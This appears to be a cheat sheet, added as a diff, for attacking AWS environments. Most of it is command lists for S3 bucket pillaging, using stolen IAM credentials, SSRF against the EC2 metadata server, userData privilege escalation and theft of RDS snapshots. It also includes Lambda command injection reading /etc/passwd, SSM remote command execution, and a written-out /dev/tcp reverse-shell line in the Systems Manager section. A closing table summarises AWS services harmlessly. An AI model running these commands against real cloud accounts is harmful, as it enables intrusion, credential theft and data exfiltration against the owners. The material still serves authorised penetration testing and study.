+<pre><code># https://github.com/fellchase/flumberboozle/tree/master/flumberbuckets
+alias flumberbuckets='sudo python3 PATH/flumberboozle/flumberbuckets/flumberbuckets.py -p'
+echo "bucket" | flumberbuckets -si -
+cat hosts.txt | flumberbuckets -si -
+
+# https://github.com/sa7mon/S3Scanner
+sudo python3 s3scanner.py sites.txt
+sudo python ./s3scanner.py --include-closed --out-file found.txt --dump names.txt
+
+# https://github.com/clario-tech/s3-inspector
+python s3inspector.py
+
+# https://github.com/jordanpotti/AWSBucketDump
+source /home/cloudhacker/tools/AWSBucketDump/bin/activate
+touch s.txt
+sed -i "s,$,-$bapname-awscloudsec,g" /home/cloudhacker/tools/AWSBucketDump/BucketNames.txt
+python AWSBucketDump.py -D -l BucketNames.txt -g s.txt
+
+# https://github.com/Ucnt/aws-s3-data-finder/
+python3 find_data.py -n bucketname -u
+
+# https://github.com/VirtueSecurity/aws-extender-cli
+python3 aws_extender_cli.py -s S3 -b flaws.cloud
+</code></pre>
+<h3 id="s3-examples-attacks"><a class="header" href="#s3-examples-attacks"><strong>S3 examples attacks</strong></a></h3>
+<pre><code># S3 Bucket Pillaging
+
+• GOAL: Locate Amazon S3 buckets and search them for interesting data
+• In this lab you will attempt to identify a publicly accessible S3 bucket hosted by an organization. After identifying it you will list out the contents of it and download the files hosted there.
+
+~$ sudo apt-get install python3-pip
+~$ git clone https://github.com/RhinoSecurityLabs/pacu
+~$ cd pacu
+~$ sudo bash install.sh
+~$ sudo aws configure
+~$ sudo python3 pacu.py
+
+Pacu &gt; import_keys --all
+# Search by domain
+Pacu &gt; run s3__bucket_finder -d glitchcloud 
+# List files in bucket
+Pacu &gt; aws s3 ls s3://glitchcloud
+# Download files
+Pacu &gt; aws s3 sync s3://glitchcloud s3-files-dir
+
+# S3 Code Injection
+• Backdoor JavaScript in S3 Buckets used by webapps 
+• In March, 2018 a crypto-miner malware was found to be loading on MSN’s homepage
+• This was due to AOL’s advertising platform having a writeable S3 bucket, which was being served by MSN
+• If a webapp is loading content from an S3 bucket made publicly writeable attackers can upload  malicious JS to get executed by visitors 
+• Can perform XSS-type attacks against webapp visitors
+• Hook browser with Beef
+
+# Domain Hijacking
+• Hijack S3 domain by finding references in a webapp to S3 buckets that don’t exist anymore
+• Or… subdomains that were linked to an S3 bucket with CNAME’s that still exist
+• When assessing webapps look for 404’s to *.s3.amazonaws.com
+• When brute forcing subdomains for an org look for 404’s with ‘NoSuchBucket’ error 
+• Go create the S3 bucket with the same name and region 
+• Load malicious content to the new S3 bucket that will be executed when visitors hit the site
+</code></pre>
+<h3 id="enumerate-read-access-buckets-script"><a class="header" href="#enumerate-read-access-buckets-script">Enumerate read access buckets script</a></h3>
+<pre><code class="language-bash">#!/bin/bash
+for i in "$@" ; do
+ if [[ $i == "--profile" ]] ; then
+            profile=$(echo "$@" | awk '{for(i=1;i&lt;=NF;i++) if ($i=="--profile") print $(i+1)}')
+            AWS_ACCESS_KEY_ID=$(cat /root/.aws/credentials | grep -i "$profile" -A 2 | grep -i = | cut -d " " -f 3 | head -n 1)
+            AWS_SECRET_ACCESS_KEY=$(cat /root/.aws/credentials | grep -i "$profile" -A 2 | grep -i = | cut -d " " -f 3 | tail -n 1)
+            break
+        fi
+done
+echo "Enumerating the buckets..."
+    aws --profile "$profile" s3 ls | cut -d ' ' -f 3 &gt; /tmp/buckets
+echo "You can read the following buckets:"
+    &gt;/tmp/readBuckets
+for i in $(cat /tmp/buckets); do
+    result=$(aws --profile "$profile" s3 ls s3://"$i" 2&gt;/dev/null | head -n 1)
+    if [ ! -z "$result" ]; then
+            echo "$i" | tee /tmp/readBuckets
+                    unset result
+    fi
+done
+</code></pre>
+<h2 id="iam"><a class="header" href="#iam">IAM</a></h2>
+<h3 id="basic-commands-1"><a class="header" href="#basic-commands-1">Basic commands</a></h3>
+<pre><code># ~/.aws/credentials
+[default]
+aws_access_key_id = XXX
+aws_secret_access_key = XXXX
+
+export AWS_ACCESS_KEY_ID=
+export AWS_SECRET_ACCESS_KEY=
+export AWS_DEFAULT_REGION=
+
+# Check valid
+aws sts get-caller-identity
+aws sdb list-domains --region us-east-1
+
+# If we can steal AWS credentials, add to your configuration
+aws configure --profile stolen
+# Open ~/.aws/credentials
+# Under the [stolen] section add aws_session_token and add the discovered token value here
+aws sts get-caller-identity --profile stolen
+
+# Get account id
+aws sts get-access-key-info --access-key-id=ASIA1234567890123456
+
+aws iam get-account-password-policy
+aws sts get-session-token
+aws iam list-users
+aws iam list-roles
+aws iam list-access-keys --user-name &lt;username&gt;
+aws iam create-access-key --user-name &lt;username&gt;
+aws iam list-attached-user-policies --user-name XXXX
+aws iam get-policy
+aws iam get-policy-version
+
+aws deploy list-applications
+
+aws directconnect describe-connections
+
+aws secretsmanager get-secret-value --secret-id &lt;value&gt; --profile &lt;container tokens&gt;
+
+aws sns publish --topic-arn arn:aws:sns:us-east-1:*account id*:aaa --message aaa
+
+# IAM Prefix meaning
+ABIA - AWS STS service bearer token
+ACCA - Context-specific credential
+AGPA - Group
+AIDA - IAM user
+AIPA - Amazon EC2 instance profile
+AKIA - Access key
+ANPA - Managed policy
+ANVA - Version in a managed policy
+APKA - Public key
+AROA - Role
+ASCA - Certificate
+ASIA - Temporary (AWS STS) access key IDs use this prefix, but are unique only in combination with the secret access key and the session token.
+</code></pre>
+<h3 id="tools"><a class="header" href="#tools">Tools</a></h3>
+<pre><code># https://github.com/andresriancho/enumerate-iam
+python enumerate-iam.py --access-key XXXXXXXXXXXXX --secret-key XXXXXXXXXXX
+python enumerate-iam.py --access-key "ACCESSKEY" --secret-key "SECRETKEY" (--session-token "$AWS_SESSION_TOKEN")
+
+# https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/aws-pentest-tools/aws_escalate.py
+python aws_escalate.py
+
+# https://github.com/andresriancho/nimbostratus
+python2 nimbostratus dump-permissions
+
+# https://github.com/nccgroup/ScoutSuite
+python3 scout.py aws
+
+# https://github.com/salesforce/cloudsplaining
+cloudsplaining download
+cloudsplaining scan
+
+# Enumerate IAM permissions without logging (stealth mode)
+# https://github.com/Frichetten/aws_stealth_perm_enum
+
+# Unauthenticated (only account id) Enumeration of IAM Users and Roles 
+# https://github.com/Frichetten/enumate_iam_using_bucket_policy
+
+# AWS Consoler
+# https://github.com/NetSPI/aws_consoler
+# Generate link to console from valid credentials
+aws_consoler -a ASIAXXXX -s SECRETXXXX -t TOKENXXXX
+
+# AWSRoleJuggler
+# https://github.com/hotnops/AWSRoleJuggler/
+# You can use one assumed role to assume another one
+./find_circular_trust.py 
+python aws_role_juggler.py -r arn:aws:iam::123456789:role/BuildRole arn:aws:iam::123456789:role/GitRole arn:aws:iam::123456789:role/ArtiRole
+
+# https://github.com/prisma-cloud/IAMFinder
+python3 iamfinder.py init
+python3 iamfinder.py enum_user --aws_id 123456789012
+
+# https://github.com/nccgroup/PMapper
+# Check IAM permissions
+
+# https://github.com/prowler-cloud/prowler
+# almost 300 checks for AWS but for pentesting and enumeraiton run:
+prowler aws --categories internet-exposed
+prowler aws --categories secrets
+# see if there is something exposed in shodan from that account
+prowler -c ec2_elastic_ip_shodan --shodan $SHODAN_API_KEY --verbose
+# check for the most important checks in terms of severity
+prowler aws --severity critical high
+</code></pre>
+<h3 id="aws-iam-cli-enumeration"><a class="header" href="#aws-iam-cli-enumeration">AWS IAM Cli Enumeration</a></h3>
+<pre><code class="language-bash"># First of all, set your profile
+aws configure --profile test 
+set profile=test # Just for convenience
+
+# Get policies available
+aws --profile "$profile" iam list-policies | jq -r ".Policies[].Arn"
+# Get specific policy version
+aws --profile "$profile" iam get-policy --policy-arn "$i" --query "Policy.DefaultVersionId" --output text
+# Get all juicy info oneliner (search for Action/Resource */*)
+profile="test"; for i in $(aws --profile "$profile" iam list-policies | jq -r '.Policies[].Arn'); do echo "Describing policy $i" &amp;&amp; aws --profile "$profile" iam get-policy-version --policy-arn "$i" --version-id $(aws --profile "$profile" iam get-policy --policy-arn "$i" --query 'Policy.DefaultVersionId' --output text); done | tee /tmp/policies.log 
+
+#List Managed User policies
+aws --profile "test" iam list-attached-user-policies --user-name "test-user"
+#List Managed Group policies
+aws --profile "test" iam list-attached-group-policies --group-name "test-group"
+#List Managed Role policies
+aws --profile "test" iam list-attached-role-policies --role-name "test-role"
+
+#List Inline User policies
+aws --profile "test" iam list-user-policies --user-name "test-user"
+#List Inline Group policies
+aws --profile "test" iam list-group-policies --group-name "test-group"
+#List Inline Role policies
+aws --profile "test" iam list-role-policies --role-name "test-role"
+
+#Describe Inline User policies 
+aws --profile "test" iam get-user-policy --user-name "test-user" --policy-name "test-policy"
+#Describe Inline Group policies
+aws --profile "test" iam get-group-policy --group-name "test-group" --policy-name "test-policy"
+#Describe Inline Role policies
+aws --profile "test" iam get-role-policy --role-name "test-role" --policy-name "test-policy"
+
+# List roles policies
+aws --profile "test" iam get-role --role-name "test-role" 
+
+# Assume role from any ec2 instance (get Admin)
+# Create instance profile
+aws iam create-instance-profile --instance-profile-name YourNewRole-Instance-Profile
+# Associate role to Instance Profile
+aws iam add-role-to-instance-profile --role-name YourNewRole --instance-profile-name YourNewRole-Instance-Profile
+# Associate Instance Profile with instance you want to use
+aws ec2 associate-iam-instance-profile --instance-id YourInstanceId --iam-instance-profile Name=YourNewRole-Instance-Profile
+
+# Get assumed roles in instance
+aws --profile test sts get-caller-identity
+
+# Shadow admin
+aws iam list-attached-user-policies --user-name {}
+aws iam get-policy-version --policy-arn provide_policy_arn --version-id $(aws iam get-policy --policy-arn provide_policy_arn --query 'Policy.DefaultVersionId' --output text)
+aws iam list-user-policies --user-name {}
+aws iam get-user-policy --policy-name policy_name_from_above_command --user-name {} | python -m json.tool
+# Vulnerables policies:
+iam:CreatUser
+iam:CreateLoginProfile
+iam:UpdateProfile
+iam:AddUserToGroup
+</code></pre>
+<h2 id="ebs"><a class="header" href="#ebs">EBS</a></h2>
+<h3 id="find-secrets-in-public-ebs"><a class="header" href="#find-secrets-in-public-ebs">Find secrets in public EBS</a></h3>
+<pre><code># Dufflebag https://github.com/bishopfox/dufflebag
+</code></pre>
+<h3 id="ebs-attack-example"><a class="header" href="#ebs-attack-example"><strong>EBS attack example</strong></a></h3>
+<pre><code># Discover EBS Snapshot and mount it to navigate
+- Obtaning public snapshot name
+aws ec2 describe-snapshots --region us-east-1 --restorable-by-user-ids all | grep -C 10 "company secrets"
+- Obtaining zone and instance
+aws ec2 describe-instances --filters Name=tag:Name,Values=attacker-machine
+- Create a new volume of it
+aws ec2 create-volume --snapshot-id snap-03616657ede4b9862 --availability-zone &lt;ZONE-HERE&gt;
+- Attach to an EC2 instance
+aws ec2 attach-volume --device /dev/sdh --instance-id &lt;INSTANCE-ID&gt; --volume-id &lt;VOLUME-ID&gt;
+    - It takes some time, to see the status:
+    aws ec2 describe-volumes --filters Name=volume-id,Values=&lt;VOLUME-ID&gt;
+- Once is mounted in EC2 instance, check it, mount it and access it:
+sudo lsblk
+sudo mount /dev/xvdh1 /mnt
+cd /mnt/home/user/companydata
+</code></pre>
+<pre><code># WeirdAAL https://github.com/carnal0wnage/weirdAAL
+</code></pre>
+<h2 id="ec2"><a class="header" href="#ec2"><strong>EC2</strong></a></h2>
+<h3 id="ec2-basic-commands"><a class="header" href="#ec2-basic-commands"><strong>EC2 basic commands</strong></a></h3>
+<pre><code># Like traditional host
+- Port enumeration
+- Attack interesting services like ssh or rdp
+
+aws ec2 describe-instances
+aws ssm describe-instance-information
+aws ec2 describe-snapshots
+aws ec2 describe-security-groups --group-ids &lt;VPC Security Group ID&gt; --region &lt;region&gt;
+aws ec2 create-volume --snapshot-id snap-123123123
+aws ec2 describe-snapshots --owner-ids {user-id}
+
+# SSH into created instance:
+ssh -i ".ssh/key.pem" &lt;user&gt;@&lt;instance-ip&gt;
+sudo mount /dev/xvdb1 /mnt
+cat /mnt/home/ubuntu/setupNginx.sh
+
+# EC2 security group
+aws ec2 describe-security-groups
+aws ec2 describe-security-groups --filters Name=ip-permission.cidr,Values='0.0.0.0/0' --query "SecurityGroups[*].[GroupName]" --output text
+</code></pre>
+<h3 id="ec2-example-attacks"><a class="header" href="#ec2-example-attacks"><strong>EC2 example attacks</strong></a></h3>
+<pre><code># SSRF to http://169.254.169.254 (Metadata server)
+curl http://&lt;ec2-ip-address&gt;/\?url\=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/public-hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/network/interfaces/
+http://169.254.169.254/latest/meta-data/local-ipv4
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key/
+http://169.254.169.254/latest/user-data
+
+# Find IAM Security Credentials
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Using EC2 instance metadata tool
+ec2-metadata -h
+# With EC2 Instance Meta Data Service version 2 (IMDSv2):
+Append X-aws-ec2-metadata-token Header generated with a PUT request to http://169.254.169.254/latest/api/token
+
+# Check directly for metadata instance
+curl -s http://&lt;ec2-ip-address&gt;/latest/meta-data/ -H 'Host:169.254.169.254'
+
+# EC2 instance connect
+aws ec2 describe-instances | jq ".[][].Instances | .[] | {InstanceId, KeyName, State}"
+aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id INSTANCE_WE_GOT_PREVIOUSLY --availability-zone zone --instance-os-user ubuntu --ssh-public-key file://shortkey.pub
+
+# EC2 AMI - Read instance, create AMI for instance and run
+aws ec2 describe-images --region specific-region
+aws ec2 create-image --instance-id ID --name "EXPLOIT" --description "Export AMI" --region specific-region
+aws ec2 import-key-pair --key-name "EXPLOIT" --public-key-material fileb:///publickeyfile
+aws ec2 describe-images --filters "Name=name,Values=EXPLOIT"
+aws ec2 run-instances --image-id {} --security-group-ids "" --subnet-id {} --count 1 --instance-type t2.micro --key-name EXPLOIT
+
+# Create volume from snapshot &amp; attach to instance id &amp;&amp; mount in local
+aws ec2 create-volume –snapshot-id snapshot_id --availability-zone zone
+aws ec2 attach-volume --volume-id above-volume-id --instance-id instance-id --device /dev/sdf
+
+# Privesc with modify-instance-attribute
+aws ec2 modify-instance-attribute --instance-id=xxx --attribute userData --value file://file.b64.txt
+file.b64.txt contains (and after base64 file.txt &gt; file.b64.txt):
+```
+Content-Type: multipart/mixed; boundary="//"
+MIME-Version: 1.0
+
+--//
+Content-Type: text/cloud-config; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment; filename="cloud-config.txt"
+
+#cloud-config
+cloud_final_modules:
+- [scripts-user, always]
+
+--//
+Content-Type: text/x-shellscript; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment; filename="userdata.txt"
+
+#!/bin/bash
+**commands here** (reverse shell, set ssh keys...)
+--//
+```
+
+# Privesc 2 with user data
+# On first launch, the EC2 instance will pull the start_script from S3 and will run it. If an adversary can write to that location, they can escalate privileges or gain control of the EC2 instance.
+#!/bin/bash
+aws s3 cp s3://example-boot-bucket/start_script.sh /root/start_script.sh
+chmod +x /root/start_script.sh
+/root/start_script.sh
+</code></pre>
+<h3 id="tools-1"><a class="header" href="#tools-1">Tools</a></h3>
+<pre><code># EC2 Shadow Copy attack
+# https://github.com/Static-Flow/CloudCopy
+
+# EC2 secrets recovery
+# https://github.com/akhil-reni/ud-peep
+</code></pre>
+<h2 id="cloudfront"><a class="header" href="#cloudfront">Cloudfront</a></h2>
+<h3 id="info"><a class="header" href="#info">Info</a></h3>
+<pre><code>Cloudfront is a CDN and it checks the HOST header in CNAMES, so:
+- The domain "test.disloops.com" is a CNAME record that points to "disloops.com".
+- The "disloops.com" domain is set up to use a CloudFront distribution.
+- Because "test.disloops.com" was not added to the "Alternate Domain Names (CNAMEs)" field for the distribution, requests to "test.disloops.com" will fail.
+- Another user can create a CloudFront distribution and add "test.disloops.com" to the "Alternate Domain Names (CNAMEs)" field to hijack the domain.
+</code></pre>
+<h3 id="tools-2"><a class="header" href="#tools-2">Tools</a></h3>
+<pre><code># https://github.com/MindPointGroup/cloudfrunt
+git clone --recursive https://github.com/MindPointGroup/cloudfrunt
+pip install -r requirements.txt
+python cloudfrunt.py -o cloudfrunt.com.s3-website-us-east-1.amazonaws.com -i S3-cloudfrunt -l list.txt
+</code></pre>
+<h2 id="aws-lambda"><a class="header" href="#aws-lambda"><strong>AWS Lambda</strong></a></h2>
+<h3 id="info-1"><a class="header" href="#info-1"><strong>Info</strong></a></h3>
+<pre><code># Welcome to serverless!!!!
+# AWS Lambda, essentially are short lived servers that run your function and provide you with output that can be then used in other applications or consumed by other endpoints.
+
+# OS command Injection in Lambda
+curl "https://API-endpoint/api/stringhere"
+
+# For a md5 converter endpoint "https://API-endpoint/api/hello;id;w;cat%20%2fetc%2fpasswd"
+aws lambda list-functions
+aws lambda get-function --function-name &lt;FUNCTION-NAME&gt;
+aws lambda get-policy
+aws apigateway get-stages
+
+# Download function code
+aws lambda list-functions
+aws lambda get-function --function-name name_we_retrieved_from_above --query 'Code.Location'
+wget -O myfunction.zip URL_from_above_step
+
+# Steal creds via XXE or SSRF reading:
+/proc/self/environ
+# If blocked try to read other vars:
+/proc/[1..20]/environ
+</code></pre>
+<h3 id="tools-3"><a class="header" href="#tools-3">Tools</a></h3>
+<pre><code># https://github.com/puresec/lambda-proxy
+# SQLMap to Lambda!!!
+python3 main.py
+sqlmap -r request.txt
+
+# https://github.com/twistlock/splash
+# Pseudo Lambda Shell
+
+</code></pre>
+<h2 id="aws-inspector"><a class="header" href="#aws-inspector"><strong>AWS Inspector</strong></a></h2>
+<pre><code># Amazon Inspector is an automated security assessment service that helps improve the security and compliance of applications deployed on AWS.
+</code></pre>
+<h2 id="aws-rds"><a class="header" href="#aws-rds"><strong>AWS RDS</strong></a></h2>
+<h3 id="basic"><a class="header" href="#basic"><strong>Basic</strong></a></h3>
+<pre><code>aws rds describe-db-instances
+</code></pre>
+<h3 id="attacks"><a class="header" href="#attacks"><strong>Attacks</strong></a></h3>
+<pre><code># Just like a MySQL, try for sqli!
+# Check if 3306 is exposed
+# Sqlmap is your friend ;)
+
+# Stealing RDS Snapshots
+- Searching partial snapshots
+aws rds describe-db-snapshots --include-public --snapshot-type public --db-snapshot-identifier arn:aws:rds:us-east-1:159236164734:snapshot:globalbutterdbbackup
+- Restore in instance
+aws rds restore-db-instance-from-db-snapshot --db-instance-identifier recoverdb --publicly-accessible --db-snapshot-identifier arn:aws:rds:us-east-1:159236164734:snapshot:globalbutterdbbackup --availability-zone us-east-1b
+- Once restored, try to access
+aws rds describe-db-instances --db-instance-identifier recoverdb
+- Reset the master credentials
+aws rds modify-db-instance --db-instance-identifier recoverdb --master-user-password NewPassword1 --apply-immediately
+    - Takes some time, you can check the status:
+    aws rds describe-db-instances
+- Try to access it from EC2 instance which was restored
+nc rds-endpoint 3306 -zvv    
+- If you can't see, you may open 3306:
+    - In RDS console, click on the recoverdb instance
+    - Click on the Security Group
+    - Add an Inbound rule for port 3306 TCP for Cloudhacker IP
+ - Then connect it
+ mysql -u &lt;username&gt; -p -h &lt;rds-instance-endpoint&gt;
+
+</code></pre>
+<h2 id="ecr"><a class="header" href="#ecr">ECR</a></h2>
+<h3 id="info-2"><a class="header" href="#info-2">Info</a></h3>
+<pre><code>Amazon Elastic Container Registry - Docker container registry
+aws ecr get-login
+aws ecr get-login-password | docker login --username AWS --password-stdin XXXXXXXXX.dkr.ecr.eu-west-1.amazonaws.com/some-registry &amp;&amp; docker pull XXXXXXXX.dkr.ecr.eu-west-1.amazonaws.com/docker-test:latest &amp;&amp; docker inspect docker-test
+aws ecr list-images --repository-name REPO_NAME --registry-id ACCOUNT_ID
+aws ecr batch-get-image --repository-name XXXX --registry-id XXXX --image-ids imageTag=latest
+aws ecr get-download-url-for-layer --repository-name XXXX --registry-id XXXX --layer-digest "sha256:XXXXX"
+
+</code></pre>
+<h3 id="tools-4"><a class="header" href="#tools-4">Tools</a></h3>
+<pre><code># After AWS credentials compromised
+
+# https://github.com/RhinoSecurityLabs/ccat
+docker run -it -v ~/.aws:/root/.aws/ -v /var/run/docker.sock:/var/run/docker.sock -v ${PWD}:/app/ rhinosecuritylabs/ccat:latest
+</code></pre>
+<h2 id="ecs"><a class="header" href="#ecs">ECS</a></h2>
+<h3 id="info-3"><a class="header" href="#info-3">Info</a></h3>
+<pre><code>ECS - Elastic Container Service (is a container orchestration service)
+</code></pre>
+<h2 id="aws-cognito-api"><a class="header" href="#aws-cognito-api"><strong>AWS Cognito API</strong></a></h2>
+<p>Amazon Cognito is a user identity and data synchronization service. If the website uses other AWS services (like Amazon S3, Amazon Dynamo DB, etc.) Amazon Cognito provides you with delivering temporary credentials with limited privileges that users can use to access database resources.</p>
+<pre><code># Check for cognito-identity requests with GetCredentialsForIdentity 
+</code></pre>
+<p><img src="../../.gitbook/assets/image%20(35).png" alt="" /></p>
+<p><img src="../../.gitbook/assets/image%20(42).png" alt="" /></p>
+<h2 id="aws-systems-manager"><a class="header" href="#aws-systems-manager"><strong>AWS Systems Manager</strong></a></h2>
+<p><img src="../../.gitbook/assets/imagen%20(21).png" alt="" /></p>
+<pre><code># AWS SSM
+- The agent must be installed in the machines
+- It's used to create roles and policies
+
+# Executing commands
+aws ssm describe-instance-information #Get instance
+aws ssm describe-instance-information --output text --query "InstanceInformationList[*]"
+- Get "ifconfig" commandId
+aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP config" --parameters commands=ifconfig --output text --query "Command.CommandId"
+- Execute CommandID generated for ifconfig
+aws ssm list-command-invocations --command-id "COMMAND-ID-HERE" --details --query "CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}"
+
+# RCE
+aws ssm send-command --document-name "AWS-RunShellScript" --comment "RCE test: whoami" --targets "Key=instanceids,Values=[instanceid]" --parameters 'commands=whoami'
+aws ssm list-command-invocations --command-id "[CommandId]" --details
+
+# Getting shell
+- You already need to have reverse.sh uploaded to s3
+#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/REVERSE-SHELL-CATCHER/9999 0&gt;&amp;1
+- Start your listener
+aws ssm send-command --document-name "AWS-RunRemoteScript" --instance-ids "INSTANCE-ID-HERE" --parameters '{"sourceType":["S3"],"sourceInfo":["{\"path\":\"PATH-TO-S3-SHELL-SCRIPT\"}"],"commandLine":["/bin/bash NAME-OF-SHELL-SCRIPT"]}' --query "Command.CommandId"
+
+# Read info from SSM
+aws ssm describe-parameters
+aws ssm get-parameters --name &lt;NameYouFindAbove&gt;
+
+# EC2 with SSM enabled leads to RCE
+aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP Config" --parameters commands=ifconfig --output text --query "Command.CommandId" --profile stolencreds
+aws ssm list-command-invocations --command-id "COMMAND-ID-HERE" --details --query "CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}" --profile stolencreds
+</code></pre>
+<h2 id="aws-services-summary"><a class="header" href="#aws-services-summary">Aws Services Summary</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>AWS Service</th><th>Should have been called</th><th>Use this to</th><th>It's like</th></tr></thead><tbody>
+<tr><td>EC2</td><td>Amazon Virtual Servers</td><td>Host the bits of things you think of as a computer.</td><td>It's handwavy, but EC2 instances are similar to the virtual private servers you'd get at Linode, DigitalOcean or Rackspace.</td></tr>
+<tr><td>IAM</td><td>Users, Keys and Certs</td><td>Set up additional users, set up new AWS Keys and policies.</td><td></td></tr>
+<tr><td>S3</td><td>Amazon Unlimited FTP Server</td><td>Store images and other assets for websites. Keep backups and share files between services. Host static websites. Also, many of the other AWS services write and read from S3.</td><td></td></tr>
+<tr><td>VPC</td><td>Amazon Virtual Colocated Rack</td><td>Overcome objections that "all our stuff is on the internet!" by adding an additional layer of security. Makes it appear as if all of your AWS services are on the same little network instead of being small pieces in a much bigger network.</td><td>If you're familar with networking: VLANs</td></tr>
+<tr><td>Lambda</td><td>AWS App Scripts</td><td>Run little self contained snippets of JS, Java or Python to do discrete tasks. Sort of a combination of a queue and execution in one. Used for storing and then executing changes to your AWS setup or responding to events in S3 or DynamoDB.</td><td></td></tr>
+<tr><td>API Gateway</td><td>API Proxy</td><td>Proxy your apps API through this so you can throttle bad client traffic, test new versions, and present methods more cleanly.</td><td>3Scale</td></tr>
+<tr><td>RDS</td><td>Amazon SQL</td><td>Be your app's Mysql, Postgres, and Oracle database.</td><td>Heroku Postgres</td></tr>
+<tr><td>Route53</td><td>Amazon DNS + Domains</td><td>Buy a new domain and set up the DNS records for that domain.</td><td>DNSimple, GoDaddy, Gandi</td></tr>
+<tr><td>SES</td><td>Amazon Transactional Email</td><td>Send one-off emails like password resets, notifications, etc. You could use it to send a newsletter if you wrote all the code, but that's not a great idea.</td><td>SendGrid, Mandrill, Postmark</td></tr>
+<tr><td>Cloudfront</td><td>Amazon CDN</td><td>Make your websites load faster by spreading out static file delivery to be closer to where your users are.</td><td>MaxCDN, Akamai</td></tr>
+<tr><td>CloudSearch</td><td>Amazon Fulltext Search</td><td>Pull in data on S3 or in RDS and then search it for every instance of 'Jimmy.'</td><td>Sphinx, Solr, ElasticSearch</td></tr>
+<tr><td>DynamoDB</td><td>Amazon NoSQL</td><td>Be your app's massively scalable key valueish store.</td><td>MongoLab</td></tr>
+<tr><td>Elasticache</td><td>Amazon Memcached</td><td>Be your app's Memcached or Redis.</td><td>Redis to Go, Memcachier</td></tr>
+<tr><td>Elastic Transcoder</td><td>Amazon Beginning Cut Pro</td><td>Deal with video weirdness (change formats, compress, etc.).</td><td></td></tr>
+<tr><td>SQS</td><td>Amazon Queue</td><td>Store data for future processing in a queue. The lingo for this is storing "messages" but it doesn't have anything to do with email or SMS. SQS doesn't have any logic, it's just a place to put things and take things out.</td><td>RabbitMQ, Sidekiq</td></tr>
+<tr><td>WAF</td><td>AWS Firewall</td><td>Block bad requests to Cloudfront protected sites (aka stop people trying 10,000 passwords against /wp-admin)</td><td>Sophos, Kapersky</td></tr>
+<tr><td>Cognito</td><td>Amazon OAuth as a Service</td><td>Give end users - (non AWS) - the ability to log in with Google, Facebook, etc.</td><td>OAuth.io</td></tr>
+<tr><td>Device Farm</td><td>Amazon Drawer of Old Android Devices</td><td>Test your app on a bunch of different IOS and Android devices simultaneously.</td><td>MobileTest, iOS emulator</td></tr>
+<tr><td>Mobile Analytics</td><td>Spot on Name, Amazon Product Managers take note</td><td>Track what people are doing inside of your app.</td><td>Flurry</td></tr>
+<tr><td>SNS</td><td>Amazon Messenger</td><td>Send mobile notifications, emails and/or SMS messages</td><td>UrbanAirship, Twilio</td></tr>
+<tr><td>CodeCommit</td><td>Amazon GitHub</td><td>Version control your code - hosted Git.</td><td>Github, BitBucket</td></tr>
+<tr><td>Code Deploy</td><td>Not bad</td><td>Get your code from your CodeCommit repo (or Github) onto a bunch of EC2 instances in a sane way.</td><td>Heroku, Capistrano</td></tr>
+<tr><td>CodePipeline</td><td>Amazon Continuous Integration</td><td>Run automated tests on your code and then do stuff with it depending on if it passes those tests.</td><td>CircleCI, Travis</td></tr>
+<tr><td>EC2 Container Service</td><td>Amazon Docker as a Service</td><td>Put a Dockerfile into an EC2 instance so you can run a website.</td><td></td></tr>
+<tr><td>Elastic Beanstalk</td><td>Amazon Platform as a Service</td><td>Move your app hosted on Heroku to AWS when it gets too expensive.</td><td>Heroku, BlueMix, Modulus</td></tr>
+<tr><td>AppStream</td><td>Amazon Citrix</td><td>Put a copy of a Windows application on a Windows machine that people get remote access to.</td><td>Citrix, RDP</td></tr>
+<tr><td>Direct Connect</td><td>Pretty spot on actually</td><td>Pay your Telco + AWS to get a dedicated leased line from your data center or network to AWS. Cheaper than Internet out for Data.</td><td>A toll road turnpike bypassing the crowded side streets.</td></tr>
+<tr><td>Directory Service</td><td>Pretty spot on actually</td><td>Tie together other apps that need a Microsoft Active Directory to control them.</td><td></td></tr>
+<tr><td>WorkDocs</td><td>Amazon Unstructured Files</td><td>Share Word Docs with your colleagues.</td><td>Dropbox, DataAnywhere</td></tr>
+<tr><td>WorkMail</td><td>Amazon Company Email</td><td>Give everyone in your company the same email system and calendar.</td><td>Google Apps for Domains</td></tr>
+<tr><td>Workspaces</td><td>Amazon Remote Computer</td><td>Gives you a standard windows desktop that you're remotely controlling.</td><td></td></tr>
+<tr><td>Service Catalog</td><td>Amazon Setup Already</td><td>Give other AWS users in your group access to preset apps you've built so they don't have to read guides like this.</td><td></td></tr>
+<tr><td>Storage Gateway</td><td>S3 pretending it's part of your corporate network</td><td>Stop buying more storage to keep Word Docs on. Make automating getting files into S3 from your corporate network easier.</td><td></td></tr>
+<tr><td>Data Pipeline</td><td>Amazon ETL</td><td>Extract, Transform and Load data from elsewhere in AWS. Schedule when it happens and get alerts when they fail.</td><td></td></tr>
+<tr><td>Elastic Map Reduce</td><td>Amazon Hadooper</td><td>Iterate over massive text files of raw data that you're keeping in S3.</td><td>Treasure Data</td></tr>
+<tr><td>Glacier</td><td>Really slow Amazon S3</td><td>Make backups of your backups that you keep on S3. Also, beware the cost of getting data back out in a hurry. For long term archiving.</td><td></td></tr>
+<tr><td>Kinesis</td><td>Amazon High Throughput</td><td>Ingest lots of data very quickly (for things like analytics or people retweeting Kanye) that you then later use other AWS services to analyze.</td><td>Kafka</td></tr>
+<tr><td>RedShift</td><td>Amazon Data Warehouse</td><td>Store a whole bunch of analytics data, do some processing, and dump it out.</td><td></td></tr>
